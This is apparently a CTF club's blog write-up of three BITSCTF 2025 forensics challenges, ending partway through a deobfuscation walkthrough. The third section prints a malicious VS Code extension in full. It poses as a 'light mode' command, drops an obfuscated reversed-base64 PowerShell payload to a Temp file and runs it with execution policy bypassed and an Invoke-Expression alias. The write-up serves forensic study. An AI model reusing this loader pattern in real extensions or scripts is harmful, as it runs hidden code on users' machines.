@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v5.1.9"><title>GopherHack</title><link rel="stylesheet" href="/_astro/poster.B_Cpo-Oc.css">
+<link rel="stylesheet" href="/_astro/_name_.B51i_3Fs.css">
+<link rel="stylesheet" href="/_astro/_post_.aVDCQf0I.css"></head> <body data-astro-cid-sckkx6r4> <section class="mainSection" data-astro-cid-sckkx6r4> <div class="content" data-astro-cid-sckkx6r4> <header data-astro-cid-sckkx6r4> <div data-astro-cid-sckkx6r4> <!-- left --> <a href="/" id="logo" data-astro-cid-sckkx6r4>
+&#x1F6A9; GopherHack</a> </div> <div data-astro-cid-sckkx6r4> <!-- right --> <div class="links" data-astro-cid-sckkx6r4> <a href="/pages/contests" data-astro-cid-sckkx6r4>Contests</a> <a href="/pages/blog" data-astro-cid-sckkx6r4>Blog</a> <a href="/pages/resources" data-astro-cid-sckkx6r4>Resources</a> <a href="/pages/officers" data-astro-cid-sckkx6r4>Officers</a> </div> <div class="buttons" data-astro-cid-sckkx6r4></div> </div> </header> <main data-astro-cid-sckkx6r4>  <h1 data-astro-cid-quoef3qp>  BITSCTF 2025: All DFIR challenges (3/3) </h1> <div class="metadata" data-astro-cid-quoef3qp> <div title="2025-02-14T08:57:16.633Z" data-astro-cid-quoef3qp> Friday, February 14, 2025 </div> <div data-astro-cid-quoef3qp>
+Authored by <a href="/authors/madarame">madarame</a> </div>  <div data-astro-cid-quoef3qp>Tags: dfir</div> </div> <div class="postContent" data-astro-cid-quoef3qp> <link rel="stylesheet" href="/_astro/styles.DOL_VcOL.css"/>
+<h3 id="challenge-1-baby-dfir">Challenge #1: Baby DFIR</h3>
+<p>We were given this file.</p>
+<blockquote>
+<a href="./abc.ad1" download="true"><p>abc.ad1</p></a>
+</blockquote>
+<h3 id="solution">Solution</h3>
+<p>Initially, when I ran strings on <code>abc.ad1</code>, I got a lot of interesting strings, including <code>flag.txt</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> strings</span><span style="color:#9ECBFF"> abc.ad1</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>ADSEGMENTEDFILE</span></span>
+<span class="line"><span>ADLOGICALIMAGE</span></span>
+<span class="line"><span>C:\Users\vboxuser\Desktop</span></span>
+<span class="line"><span>C:\Users\vboxuser\Desktop]</span></span>
+<span class="line"><span>desktop.ini</span></span>
+<span class="line"><span>&amp;-QL</span></span>
+<span class="line"><span>w^L_W</span></span>
+<span class="line"><span>20250206T225205.079274</span></span>
+<span class="line"><span>20250206T222016.621066B</span></span>
+<span class="line"><span>20250206T222016.621066[</span></span>
+<span class="line"><span>falset</span></span>
+<span class="line"><span>false</span></span>
+<span class="line"><span>true</span></span>
+<span class="line"><span>true</span></span>
+<span class="line"><span>true</span></span>
+<span class="line"><span>false</span></span>
+<span class="line"><span>true!</span></span>
+<span class="line"><span>9e36cc3537ee9ee1e3b10fa4e761045b</span></span>
+<span class="line"><span>7726f55012e1e26cc762c9982e7c6c54ca7bb303</span></span>
+<span class="line"><span>flag.txt</span></span>
+<span class="line"><span>20250206T225151.348146k</span></span>
+<span class="line"><span>20250206T225125.094082</span></span>
+<span class="line"><span>20250206T225151.158078</span></span>
+<span class="line"><span>false</span></span>
+<span class="line"><span>false</span></span>
+<span class="line"><span>true</span></span>
+<span class="line"><span>false</span></span>
+<span class="line"><span>false*</span></span>
+<span class="line"><span>falseB</span></span>
+<span class="line"><span>truev</span></span>
+<span class="line"><span>3677fb16caa7ba1e220668079cf26838</span></span>
+<span class="line"><span>035037471f31c918556e266b9bfc1bbd4c026ce5ATTRGUID</span></span>
+<span class="line"><span>5Lv!G</span></span>
+<span class="line"><span>d:~O</span></span>
+<span class="line"><span>e.*`^</span></span>
+<span class="line"><span>ZMq@</span></span>
+<span class="line"><span>@&#39;#$L</span></span>
+<span class="line"><span>LOCSGUID</span></span></code></pre>
+<p>We can see that <code>flag.txt</code> is among the strings. Let’s extract it using binwalk.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> binwalk</span><span style="color:#79B8FF"> -e</span><span style="color:#79B8FF"> --run-as=root</span><span style="color:#9ECBFF"> abc.ad1</span><span style="color:#E1E4E8"> &amp;&amp; </span><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> _abc.ad1.extracted/</span><span style="color:#79B8FF">*</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> &quot;BITSCTF&quot;</span></span></code></pre>
+<p>After extracting the file, we can easily find the flag.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>DECIMAL       HEXADECIMAL     DESCRIPTION</span></span>
+<span class="line"><span>--------------------------------------------------------------------------------</span></span>
+<span class="line"><span>35            0x23            LZMA compressed data, properties: 0x5D, dictionary size: 0 bytes, uncompressed size: 512 bytes</span></span>
+<span class="line"><span>765           0x2FD           Zlib compressed data, default compression</span></span>
+<span class="line"><span>1461          0x5B5           Zlib compressed data, default compression</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>BITSCTF{a_really_simple_intro_to_DFIR_12848a9e}</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<p>Flag: <code>BITSCTF{a_really_simple_intro_to_DFIR_12848a9e}</code></p>
+<hr/>
+<h3 id="challenge-2-virus-camp-1">Challenge #2: ViruS Camp 1</h3>
+<p>We were given this file.</p>
+<blockquote>
+<p>dimp.ad1</p>
+</blockquote>
+<h3 id="solution-1">Solution</h3>
+<p>When I ran strings on <code>dimp.ad1</code>, I got a bunch of strings and it’s a very large file, so I would guess the solution is not intended to be solved by strings or any simple method.
+I decided to use <code>FTK Imager</code>, a really good tool for Disk Image Forensics, to open the file.
+Since the challenge’s name is “ViruS Camp” with intentionally uppercase characters that spelled <code>VSC</code>, I thought it might be a good idea to check out the folder <code>.vscode</code> first.
+Digging around a little bit, I found this string</p>
+<img src="/_astro/image.Cg35bvyr.png" alt="image" style="max-width:100%;height:auto"/>
+<p>Decode the string with base64 and we get the flag.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> echo</span><span style="color:#9ECBFF"> &quot;VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> base64</span><span style="color:#79B8FF"> -d</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>The 1st flag is: BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}</span></span></code></pre>
+<p>Flag: <code>BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}</code></p>
+<hr/>
+<h3 id="challenge-3-virus-camp-2">Challenge #3: ViruS Camp 2</h3>
+<p>We were given this file (the same file as in the previous challenge).</p>
+<blockquote>
+<p>dimp.ad1</p>
+</blockquote>
+<h3 id="solution-2">Solution</h3>
+<p>My only guess is that the flag can be retrieved by deofuscating the file where I found the flag in the previous challenge.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#9ECBFF">&quot;use strict&quot;</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> __createBinding </span><span style="color:#F97583">=</span></span>
+<span class="line"><span style="color:#E1E4E8">  (</span><span style="color:#79B8FF">this</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.__createBinding) </span><span style="color:#F97583">||</span></span>
+<span class="line"><span style="color:#E1E4E8">  (Object.create</span></span>
+<span class="line"><span style="color:#F97583">    ?</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">m</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">k</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">k2</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (k2 </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> undefined</span><span style="color:#E1E4E8">) k2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> k;</span></span>
+<span class="line"><span style="color:#F97583">        var</span><span style="color:#E1E4E8"> desc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Object.</span><span style="color:#B392F0">getOwnPropertyDescriptor</span><span style="color:#E1E4E8">(m, k);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span></span>
+<span class="line"><span style="color:#F97583">          !</span><span style="color:#E1E4E8">desc </span><span style="color:#F97583">||</span></span>
+<span class="line"><span style="color:#E1E4E8">          (</span><span style="color:#9ECBFF">&quot;get&quot;</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> desc </span><span style="color:#F97583">?</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8">m.__esModule </span><span style="color:#F97583">:</span><span style="color:#E1E4E8"> desc.writable </span><span style="color:#F97583">||</span><span style="color:#E1E4E8"> desc.configurable)</span></span>
+<span class="line"><span style="color:#E1E4E8">        ) {</span></span>
+<span class="line"><span style="color:#E1E4E8">          desc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">            enumerable: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#B392F0">            get</span><span style="color:#E1E4E8">: </span><span style="color:#F97583">function</span><span style="color:#E1E4E8"> () {</span></span>
+<span class="line"><span style="color:#F97583">              return</span><span style="color:#E1E4E8"> m[k];</span></span>
+<span class="line"><span style="color:#E1E4E8">            },</span></span>
+<span class="line"><span style="color:#E1E4E8">          };</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        Object.</span><span style="color:#B392F0">defineProperty</span><span style="color:#E1E4E8">(o, k2, desc);</span></span>
+<span class="line"><span style="color:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#F97583">    :</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">m</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">k</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">k2</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (k2 </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> undefined</span><span style="color:#E1E4E8">) k2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> k;</span></span>
+<span class="line"><span style="color:#E1E4E8">        o[k2] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> m[k];</span></span>
+<span class="line"><span style="color:#E1E4E8">      });</span></span>
+<span class="line"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> __setModuleDefault </span><span style="color:#F97583">=</span></span>
+<span class="line"><span style="color:#E1E4E8">  (</span><span style="color:#79B8FF">this</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.__setModuleDefault) </span><span style="color:#F97583">||</span></span>
+<span class="line"><span style="color:#E1E4E8">  (Object.create</span></span>
+<span class="line"><span style="color:#F97583">    ?</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        Object.</span><span style="color:#B392F0">defineProperty</span><span style="color:#E1E4E8">(o, </span><span style="color:#9ECBFF">&quot;default&quot;</span><span style="color:#E1E4E8">, { enumerable: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">, value: v });</span></span>
+<span class="line"><span style="color:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#F97583">    :</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        o[</span><span style="color:#9ECBFF">&quot;default&quot;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v;</span></span>
+<span class="line"><span style="color:#E1E4E8">      });</span></span>
+<span class="line"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> __importStar </span><span style="color:#F97583">=</span></span>
+<span class="line"><span style="color:#E1E4E8">  (</span><span style="color:#79B8FF">this</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.__importStar) </span><span style="color:#F97583">||</span></span>
+<span class="line"><span style="color:#E1E4E8">  (</span><span style="color:#F97583">function</span><span style="color:#E1E4E8"> () {</span></span>
+<span class="line"><span style="color:#F97583">    var</span><span style="color:#B392F0"> ownKeys</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">      ownKeys </span><span style="color:#F97583">=</span></span>
+<span class="line"><span style="color:#E1E4E8">        Object.getOwnPropertyNames </span><span style="color:#F97583">||</span></span>
+<span class="line"><span style="color:#F97583">        function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">o</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">          var</span><span style="color:#E1E4E8"> ar </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [];</span></span>
+<span class="line"><span style="color:#F97583">          for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">var</span><span style="color:#E1E4E8"> k </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> o)</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">Object</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">prototype</span><span style="color:#E1E4E8">.hasOwnProperty.</span><span style="color:#B392F0">call</span><span style="color:#E1E4E8">(o, k)) ar[ar.</span><span style="color:#79B8FF">length</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> k;</span></span>
+<span class="line"><span style="color:#F97583">          return</span><span style="color:#E1E4E8"> ar;</span></span>
+<span class="line"><span style="color:#E1E4E8">        };</span></span>
+<span class="line"><span style="color:#F97583">      return</span><span style="color:#B392F0"> ownKeys</span><span style="color:#E1E4E8">(o);</span></span>
+<span class="line"><span style="color:#E1E4E8">    };</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">mod</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> (mod </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> mod.__esModule) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8"> mod;</span></span>
+<span class="line"><span style="color:#F97583">      var</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {};</span></span>
+<span class="line"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> (mod </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">var</span><span style="color:#E1E4E8"> k </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ownKeys</span><span style="color:#E1E4E8">(mod), i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&lt;</span><span style="color:#E1E4E8"> k.</span><span style="color:#79B8FF">length</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">          if</span><span style="color:#E1E4E8"> (k[i] </span><span style="color:#F97583">!==</span><span style="color:#9ECBFF"> &quot;default&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">__createBinding</span><span style="color:#E1E4E8">(result, mod, k[i]);</span></span>
+<span class="line"><span style="color:#B392F0">      __setModuleDefault</span><span style="color:#E1E4E8">(result, mod);</span></span>
+<span class="line"><span style="color:#F97583">      return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    };</span></span>
+<span class="line"><span style="color:#E1E4E8">  })();</span></span>
+<span class="line"><span style="color:#E1E4E8">Object.</span><span style="color:#B392F0">defineProperty</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">exports</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">&quot;__esModule&quot;</span><span style="color:#E1E4E8">, { value: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#79B8FF">exports</span><span style="color:#E1E4E8">.activate </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> activate;</span></span>
+<span class="line"><span style="color:#79B8FF">exports</span><span style="color:#E1E4E8">.deactivate </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> deactivate;</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> vscode</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> __importStar</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">require</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;vscode&quot;</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> child_process_1</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> require</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;child_process&quot;</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> fs</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> __importStar</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">require</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;fs&quot;</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> activate</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">context</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> command</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> vscode.commands.</span><span style="color:#B392F0">registerCommand</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;rs&quot;</span><span style="color:#E1E4E8">, () </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> scriptContent</span><span style="color:#E1E4E8"> = `$wy7qIGPnm36HpvjrL2TMUaRbz = &quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot; ;</span></span>
+<span class="line"><span style="color:#E1E4E8">$9U5RgiwHSYtbsoLuD3Vf6 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $wy7qIGPnm36HpvjrL2TMUaRbz.</span><span style="color:#B392F0">ToCharArray</span><span style="color:#E1E4E8">() ; [array]::</span><span style="color:#B392F0">Reverse</span><span style="color:#E1E4E8">($9U5RgiwHSYtbsoLuD3Vf6) ; </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">join $9U5RgiwHSYtbsoLuD3Vf6 </span><span style="color:#79B8FF">2</span><span style="color:#F97583">&gt;&amp;</span><span style="color:#79B8FF">1</span><span style="color:#F97583">&gt;</span><span style="color:#E1E4E8"> $null ;</span></span>
+<span class="line"><span style="color:#E1E4E8">$FHG7xpKlVqaDNgu1c2Utw </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [systeM.tEXT.ENCODIng]::uTf8.</span><span style="color:#B392F0">geTStRInG</span><span style="color:#E1E4E8">([sYsTeM.CoNVeRt]::</span><span style="color:#B392F0">FROMBase64StRIng</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;</span><span style="color:#E1E4E8">)) ;</span></span>
+<span class="line"><span style="color:#E1E4E8">$9ozWfHXdm8eIBYru </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;InV&quot;</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">&quot;okE&quot;</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">&quot;-ex&quot;</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">&quot;prE&quot;</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">&quot;SsI&quot;</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">&quot;ON&quot;</span><span style="color:#E1E4E8"> ; </span><span style="color:#F97583">new-</span><span style="color:#E1E4E8">aliaS </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">Name PwN </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">ValUe $9ozWfHXdm8eIBYru </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;</span><span style="color:#9ECBFF">`;</span></span>
+<span class="line"><span style="color:#9ECBFF">    const scriptPath = `</span><span style="color:#B392F0">C</span><span style="color:#E1E4E8">:\\Users\\vboxuser\\AppData\\Local\\Temp\\</span><span style="color:#B392F0">temp0001</span><span style="color:#9ECBFF">`;</span></span>
+<span class="line"><span style="color:#9ECBFF">    try {</span></span>
+<span class="line"><span style="color:#9ECBFF">      fs.writeFileSync(scriptPath, scriptContent);</span></span>
+<span class="line"><span style="color:#9ECBFF">      vscode.window.showInformationMessage(</span></span>
+<span class="line"><span style="color:#9ECBFF">        `</span><span style="color:#E1E4E8">The light mode will activate </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> a few minutes.</span><span style="color:#9ECBFF">`</span></span>
+<span class="line"><span style="color:#9ECBFF">      );</span></span>
+<span class="line"><span style="color:#9ECBFF">    } catch (error) {</span></span>
+<span class="line"><span style="color:#9ECBFF">      vscode.window.showErrorMessage(`</span><span style="color:#E1E4E8">Error activating light mode.</span><span style="color:#9ECBFF">`);</span></span>
+<span class="line"><span style="color:#9ECBFF">    }</span></span>
+<span class="line"><span style="color:#9ECBFF">    (0, child_process_1.exec)(</span></span>
+<span class="line"><span style="color:#9ECBFF">      `</span><span style="color:#E1E4E8">powershell.exe </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">ExecutionPolicy Bypass </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">File </span><span style="color:#9ECBFF">&quot;${scriptPath}&quot;`,</span></span>
+<span class="line"><span style="color:#9ECBFF">      (error, stdout, stderr) =&gt; {</span></span>
+<span class="line"><span style="color:#9ECBFF">        if (error) {</span></span>
+<span class="line"><span style="color:#9ECBFF">          console.error(`</span><span style="color:#B392F0">Error</span><span style="color:#E1E4E8">: ${error.message}</span><span style="color:#9ECBFF">`);</span></span>
+<span class="line"><span style="color:#9ECBFF">        }</span></span>
+<span class="line"><span style="color:#9ECBFF">        if (stderr) {</span></span>
+<span class="line"><span style="color:#9ECBFF">          console.error(`</span><span style="color:#B392F0">Stderr</span><span style="color:#E1E4E8">: ${stderr}</span><span style="color:#9ECBFF">`);</span></span>
+<span class="line"><span style="color:#9ECBFF">        }</span></span>
+<span class="line"><span style="color:#9ECBFF">        console.log(`</span><span style="color:#B392F0">Stdout</span><span style="color:#E1E4E8">: ${stdout}</span><span style="color:#9ECBFF">`);</span></span>
+<span class="line"><span style="color:#9ECBFF">      }</span></span>
+<span class="line"><span style="color:#9ECBFF">    );</span></span>
+<span class="line"><span style="color:#9ECBFF">  });</span></span>
+<span class="line"><span style="color:#9ECBFF">  context.subscriptions.push(command);</span></span>
+<span class="line"><span style="color:#9ECBFF">}</span></span>
+<span class="line"><span style="color:#9ECBFF">// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9</span></span>
+<span class="line"><span style="color:#9ECBFF">function deactivate() {}</span></span>
+<span class="line"><span style="color:#9ECBFF">//# sourceMappingURL=extension.js.map</span></span></code></pre>
+<p>I also found the file <code>flag.enc</code> in <code>dimp.ad1\C:\Users\vboxuser\Desktop</code> so I right-clicked on it and clicked “export files” to get it.</p>
+<p>This javascript code is obfuscated, but let’s break it down step by step:</p>
+<p>Deobfuscation Process:</p>
+<ol>
+<li>Extracting the Base64 String</li>
+</ol>
+<p><code>$wy7qIGPnm36HpvjrL2TMUaRbz</code> holds a long Base64-encoded string.</p>
+<ol start="2">
+<li>Reversing the String</li>
+</ol>
+<p><code>$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray()</code>
+<code>[array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6)</code>
+The script reverses the Base64-encoded string before decoding.</p>
+<ol start="3">
+<li>Decoding from Base64</li>
+</ol>
+<p><code>$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng(&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;))</code>
+Converts the reversed Base64 string back to readable text.</p>
+<ol start="4">
+<li>Executing the Decoded Script</li>
